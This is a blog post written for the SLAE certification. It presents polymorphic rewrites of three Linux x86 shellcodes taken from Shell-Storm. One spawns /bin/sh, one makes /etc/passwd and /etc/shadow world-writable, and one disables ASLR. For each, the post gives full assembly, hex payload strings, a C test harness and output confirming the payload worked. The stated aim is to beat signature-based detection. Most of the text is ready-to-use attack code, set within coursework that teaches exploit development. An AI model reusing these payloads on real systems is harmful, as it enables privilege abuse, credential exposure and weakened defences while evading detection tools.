# SLAE course
This blog post has been created for completing the requirements of the SecurityTube Linux.

Assembly Expert certification:
* https://www.pentesteracademy.com/course?id=3

Student ID: SLAE-XXXXX

## Assignment#6: What to do ?
For this assignment we have to:
* Take up to 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching.
* The polymorphic version cannot be larger 150% of the existing shellcode. 

Bonus points:
* Making the shellcode shorter than the original.

Now, let's get to work.
=

## 1) First shellcode: execve shellcode
* Original length: 23 bytes
* Polymorphic length: 33 bytes (increase of 44%)
* Source: http://shell-storm.org/shellcode/files/shellcode-827.php

### The original version:
```asm
;Shellcode size : 23 bytes
global _start

_start:
    xor eax, eax            ;initialize eax to NULL
    push eax                ;push NULL on the stack
    
    push 0x68732f2f     
    push 0x6e69622f         ;push /bin/sh
    mov ebx, esp            ;intialize ebx to "/bin/sh%00"

    push eax                ;Push NULL on the stack
    push ebx                ;Push '/bin/sh%00' on the stack
    mov ecx, esp            ;intialize ecx to "/bin/sh%00"

    mov al, 0xb             ;move the systemcall number 

    ;Systemcall details:
    ; --> execve("/bin/sh%00", ["/bin/sh%00", NULL], NULL)
    int 0x80                ;execute systemcall
```

### The polymophic version:
```asm
;Shellcode size: 33 bytes
global _start

_start:
    xor eax, eax            ;initialize eax to NULL
    push eax                ;Push NULL on the stack
    
    mov edx, 0xb6de91c0     ;Move 0xb6de91c0 into edx 
    xor edx, 0xdeadbeef     ;Xor 0xb6de91c0 with 0xdeadbeef
    push edx                ;Push '//sh' on the stack
    push 0x6e69622f         ;Push '/bin' on the stack
    mov ebx, esp            ;Initilialize ebx to "/bin/sh%00"

    push 0x1                ;Push 0x1 on the stack
    pop ecx                 ;Pop 0x1 inside ecx
    dec ecx                 ;dec ecx by one
    xor edx, edx            ;initialize edx to NULL

    push 0xb                ;Push 0xb on the stack
    pop eax                 ;Pop the execve systemcall number inside eax 

    ;Systemcall details:
    ; --> execve("/bin/sh%00", NULL, NULL)
    int 0x80                ;execute systemcall
```

Let's compile it:
```console
kali@kali:/tmp$ nasm -f elf32 -o execve_poly.o execve_poly.nasm
kali@kali:/tmp$ ld -m elf_i386 -z execstack -o execve_poly execve_poly.o
```

We can obtain the hexadecimal representation of the previous code by using the following command:
```console
kali@kali:/tmp$ objdump -d ./execve_poly |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc0\x50\xba\xc0\x91\xde\xb6\x81\xf2\xef\xbe\xad\xde\x52\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x01\x59\x49\x31\xd2\x6a\x0b\x58\xcd\x80"
```

The following C code is used to test our polymophic code:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\xba\xc0\x91\xde\xb6\x81\xf2\xef\xbe\xad\xde\x52\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x01\x59\x49\x31\xd2\x6a\x0b\x58\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Let's compile and run it:
```console
kali@kali:/tmp$ gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
kali@kali:/tmp$ ./test_shellcode 
Shellcode Length:  33
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
$ exit
kali@kali:/tmp$
```

## 2) Second shellcode: change "/etc/shadow" permissions shellcode
* Original length: 59 bytes
* Polymorphic length: 83 bytes (increase of 40%)
* Source: http://shell-storm.org/shellcode/files/shellcode-812.php

### The original version:
```asm
;Shellcode size : 59 bytes
global _start

_start:
    xor eax, eax                        ;Initialize eax to NULL
    mov cx, 0x1b6                       ;Move 0x1b6 inside cx (666 in octal)
    push eax                            ;Push a NULL byte on the stack 
    push 0x64777373
    push 0x61702f2f
    push 0x6374652f                     ;Push "/etc//passwd%00" on the stack
    mov ebx, esp                        ;Initialize ebx to the esp stack pointer
    mov al, 0xf                         ;move the systemcall number inside eax

    ;Systemcall details:
    ; --> chmod("/etc/passwd%00", 0666o)
    int 0x80                            ;execute systemcall

    xor eax, eax                        ;Initialize eax to NULL
    push eax                            ;Push a NULL byte on the stack 
    push 0x776f6461
    push 0x68732f2f
    push 0x6374652f                     ;Push "/etc//shadow%00" on the stack
    mov ebx, esp                        ;Initialize ebx to the esp stack pointer
    mov al, 0xf                         ;move the systemcall number inside eax


    ;Systemcall details:
    ; --> chmod("/etc/shadow%00", 0666o)
    int 0x80                            ;execute systemcall


    xor eax, eax                        ;Initialize eax to NULL
    xor ebx, ebx                        ;Initialize eax to NULL
    inc eax                             ;move the systemcall number inside eax
    ;Systemcall details:
    ; --> exit(0)
    int 0x80                            ;execute systemcall
```

### The polymophic version:
```asm
;Shellcode size : 83 bytes
global _start

_start:
    xor eax, eax                        ;Initialize eax to NULL
    mov cx, 0x1b6                       ;Move 0x1b6 inside cx (666 in octal)
 
    push eax                            ;Push a NULL byte on the stack
    push 0x64777373
    mov edi, 0x2e3cfbfc
    add edi, 0x33333333
    push edi
    mov edi, 0x63746541
    sub edi, 0x12
    push edi                            ;Push "/etc//passwd%00" on the stack
    mov ebx, esp                        ;Initialize ebx to the esp stack pointer

    push 0xf                        
    pop eax                             ;move the systemcall number inside eax
    ;Systemcall details:
    ; --> chmod("/etc/passwd%00", 0666o)
    int 0x80                            ;execute systemcall

    push 0x1
    pop eax
    dec eax                             ;Initialize eax to NULL
    push eax                            ;Push a NULL byte on the stack

    mov edi, 0x443C312E
    add edi, 0x33333333
    push edi
    push 0x68732f2f
    push 0x6374652f                     ;Push "/etc//shadow%00" on the stack        
    mov ebx, esp                        ;Initialize ebx to the esp stack pointer
    
    mov dl, 0xf                         
    xchg al, dl                         ;move the systemcall number inside eax

    ;Systemcall details:
    ; --> chmod("/etc/shadow%00", 0666o)
    int 0x80                            ;execute systemcall


    push 0x1
    pop eax                             ;move the systemcall number inside eax
    mov ebx, eax
    dec ebx                             ;Initialize ebx to 0
    ;Systemcall details:
    ; --> exit(0)
    int 0x80                            ;execute systemcall
```

Let's compile it:
```console
kali@kali:/tmp$ nasm -f elf32 -o chmod_666_poly.o chmod_666_poly.nasm
kali@kali:/tmp$ ld -m elf_i386 -z execstack -o chmod_666_poly chmod_666_poly.o
```

We can obtain the hexadecimal representation of the previous code by using the following command:
```console
kali@kali:/tmp$ objdump -d ./chmod_666_poly |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64\xbf\xfc\xfb\x3c\x2e\x81\xc7\x33\x33\x33\x33\x57\xbf\x41\x65\x74\x63\x83\xef\x12\x57\x89\xe3\x6a\x0f\x58\xcd\x80\x6a\x01\x58\x48\x50\xbf\x2e\x31\x3c\x44\x81\xc7\x33\x33\x33\x33\x57\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xb2\x0f\x86\xc2\xcd\x80\x6a\x01\x58\x89\xc3\x4b\xcd\x80"
```

The following C code is used to test our polymophic code:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64\xbf\xfc\xfb\x3c\x2e\x81\xc7\x33\x33\x33\x33\x57\xbf\x41\x65\x74\x63\x83\xef\x12\x57\x89\xe3\x6a\x0f\x58\xcd\x80\x6a\x01\x58\x48\x50\xbf\x2e\x31\x3c\x44\x81\xc7\x33\x33\x33\x33\x57\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xb2\x0f\x86\xc2\xcd\x80\x6a\x01\x58\x89\xc3\x4b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Let's compile and run it:
```console
kali@kali:/tmp$ gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
kali@kali:/tmp$ sudo ./test_shellcode 
[sudo] password for kali: 
Shellcode Length:  83
kali@kali:/tmp$ ls -al /etc/passwd
-rw-rw-rw- 1 root root 3111 Jan 27 12:52 /etc/passwd
kali@kali:/tmp$ ls -al /etc/shadow
-rw-rw-rw- 1 root shadow 1639 Jan 27 12:52 /etc/shadow
```

## 3) Third shellcode: ASLR desactivation shellcode
* Original length: 83 bytes
* Polymorphic length: 123 bytes (increase of 48%)
* Source: http://shell-storm.org/shellcode/files/shellcode-813.php

### The original version:
```asm
;Shellcode size : 83 bytes
global _start

_start:
    xor eax, eax        ;Initialize eax to NULL
    push eax            ;Push NULL on the stack
    push 0x65636170
    push 0x735f6176
    push 0x5f657a69
    push 0x6d6f646e
    push 0x61722f6c
    push 0x656e7265
    push 0x6b2f7379
    push 0x732f636f
    push 0x72702f2f     ;Push //proc/sys/kernel/randomize_va_space
    mov ebx, esp        ;Initialize ebx to "//proc/sys/kernel/randomize_va_space%00"
    mov cx, 0x2bc       ;Move 0x2bc on the stack which is 700 in decimal 
                        ;700 means the file is opened with READ, WRITE, EXECUTE flags.
    mov al, 0x8         ;Initialize al to systemcall number of "open"

    ;Systemcall details:
    ; --> fd = open("//proc/sys/kernel/randomize_va_space%00", S_IRWXU)
    int 0x80            ;Execute systemcall


    mov ebx, eax        ;Move the return value of "open" which is the file descriptor inside ebx
    push eax            ;Push the file descriptor on the stack
    mov dx, 0x3a30      ;Move 0x3a30 into edx
    push dx             ;push 0x3a30 on the stack
    mov ecx, esp        ;initialize ecx to stack pointer esp
    xor edx, edx        ;Initialize edx to NULL
    inc edx             ;Increment edx 
    mov al, 0x4         ;Initialize al to systemcall number of "write"

    ;Systemcall details:
    ; --> write(3, "0", 1)
    int 0x80            ;Execute systemcall


    mov al, 0x6         ;Initialize al to systemcall number of "close"
    ;Systemcall details:
    ; --> close(3)
    int 0x80            ;Execute systemcall


    xor eax, eax        ;Initialize al to systemcall number of "exit"
    xor ebx, ebx        ;Initiliaze ebx to NULL
    ;Systemcall details:
    ; --> exit(0)
    int 0x80            ;Execute systemcall
```

### The polymophic version:
```asm
;Shellcode size : 123 bytes (+48%)
global _start

_start:              
    xor ecx, ecx             ;Initialize eax to NULL
    jmp _useless             ;Jump to some useless code, because why not

_goback:
    push ecx                 ;Push NULL on the stack
    push 0x65636170
    push 0x735f6176
    push 0x5f657a69
    mov esi, 0x7C4D572A
    xor esi, 0x11223344
    push esi
    push 0x61722f6c
    push 0x656e7265
    push 0x6b2f7379
    push 0x732f636f
    push 0x72702f2f         ;Push //proc/sys/kernel/randomize_va_space
    mov ebx, esp            ;Initialize ebx to "//proc/sys/kernel/randomize_va_space%00"
    
    mov cx, 0x1ab
    add cx, 0x111           ;Move 0x2bc on the stack which is 700 in decimal 
                            ;700 means the file is opened with READ, WRITE, EXECUTE flags.
    push 10
    pop eax
    dec eax
    dec eax                 ;Initialize al to systemcall number of "open"

    ;Systemcall details:
    ; --> fd = open("//proc/sys/kernel/randomize_va_space%00", S_IRWXU)
    int 0x80                ;Execute systemcall


    mov esi, eax        
    push esi
    pop ebx                 ;Move the return value of "open" which is the file descriptor inside ebx

    push eax                ;Push the file descriptor on the stack
    mov dx, 0x3a30          ;Move 0x3a30 into edx
    push dx                 ;push 0x3a30 on the stack
    mov ecx, esp            ;initialize ecx to stack pointer esp

    push 0x1
    pop edx                 ;Initialize edx to 1
    mov al, 0x4             ;Initialize al to systemcall number of "write"

    ;Systemcall details:
    ; --> write(3, "0", 1)
    int 0x80                ;Execute systemcall

    mov al, 0x3c
    sub al, 0x36            ;Initialize al to systemcall number of "close"
    ;Systemcall details:
    ; --> close(3)
    int 0x80                ;Execute systemcall


    xor eax, eax            ;Initialize al to systemcall number of "exit"
    push eax
    pop ebx                 ;Initiliaze ebx to NULL
    inc eax
    ;Systemcall details:
    ; --> exit(0)
    int 0x80                ;Execute systemcall

_useless:
    mov edi, 0xbadc0ff3     ;initialize edi to 0x1badc0ff3
    nop                     ;a nop instruction
    push edi                ;Push edi on the stack
    mov cl, 10              ;mov 10 inside cl

_return:
    loop _return            ;loop 10 times
    xor ecx, ecx            ;initialize ecx to NULL
    jmp _goback             ;Go back to the real code
```

Let's compile it:
```console
kali@kali:/tmp$ nasm -f elf32 -o desactivate_ASLR_poly.o desactivate_ASLR_poly.nasm
kali@kali:/tmp$ ld -m elf_i386 -z execstack -o desactivate_ASLR_poly desactivate_ASLR_poly.o
```

We can obtain the hexadecimal representation of the previous code by using the following command:
```console
kali@kali:/tmp$ objdump -d ./desactivate_ASLR_poly |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc9\xeb\x68\x51\x68\x70\x61\x63\x65\x68\x76\x61\x5f\x73\x68\x69\x7a\x65\x5f\xbe\x2a\x57\x4d\x7c\x81\xf6\x44\x33\x22\x11\x56\x68\x6c\x2f\x72\x61\x68\x65\x72\x6e\x65\x68\x79\x73\x2f\x6b\x68\x6f\x63\x2f\x73\x68\x2f\x2f\x70\x72\x89\xe3\x66\xb9\xab\x01\x66\x81\xc1\x11\x01\x6a\x0a\x58\x48\x48\xcd\x80\x89\xc6\x56\x5b\x50\x66\xba\x30\x3a\x66\x52\x89\xe1\x6a\x01\x5a\xb0\x04\xcd\x80\xb0\x3c\x2c\x36\xcd\x80\x31\xc0\x50\x5b\x40\xcd\x80\xbf\xf3\x0f\xdc\xba\x90\x57\xb1\x0a\xe2\xfe\x31\xc9\xeb\x89"
```

The following C code is used to test our polymophic code:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xeb\x68\x51\x68\x70\x61\x63\x65\x68\x76\x61\x5f\x73\x68\x69\x7a\x65\x5f\xbe\x2a\x57\x4d\x7c\x81\xf6\x44\x33\x22\x11\x56\x68\x6c\x2f\x72\x61\x68\x65\x72\x6e\x65\x68\x79\x73\x2f\x6b\x68\x6f\x63\x2f\x73\x68\x2f\x2f\x70\x72\x89\xe3\x66\xb9\xab\x01\x66\x81\xc1\x11\x01\x6a\x0a\x58\x48\x48\xcd\x80\x89\xc6\x56\x5b\x50\x66\xba\x30\x3a\x66\x52\x89\xe1\x6a\x01\x5a\xb0\x04\xcd\x80\xb0\x3c\x2c\x36\xcd\x80\x31\xc0\x50\x5b\x40\xcd\x80\xbf\xf3\x0f\xdc\xba\x90\x57\xb1\x0a\xe2\xfe\x31\xc9\xeb\x89";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Let's compile and run it:
```console
kali@kali:/tmp$ gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
kali@kali:/tmp$ sudo ./test_shellcode 
Shellcode Length:  123
kali@kali:/tmp$ cat /proc/sys/kernel/randomize_va_space
0
kali@kali:/tmp$
```